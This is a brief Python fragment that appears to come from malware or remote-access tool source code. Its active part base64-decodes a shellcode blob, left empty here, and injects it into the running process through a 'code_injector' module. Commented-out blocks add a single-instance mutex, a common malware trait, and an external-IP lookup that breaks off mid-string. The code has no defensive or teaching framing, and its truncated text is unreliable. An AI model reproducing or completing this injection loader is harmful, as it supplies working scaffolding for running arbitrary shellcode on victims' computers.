'''
# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()
'''

import code_injector, base64
# base64 shellcode
b64shellcode = ""
shellcode = base64.b64decode(b64shellcode)  # decrypt shellcode
pid = os.getpid()  # get current pid

code_injector.InjectShellCode(pid, shellcode)  # inject the shellcode into the program

'''
def GetExIp(): # function to get external ip
    global strExIP
    try:
        strExIP = urlopen("http://ident.me").read().decode('utf8')
    except:
        strExIP = "?
'''
  
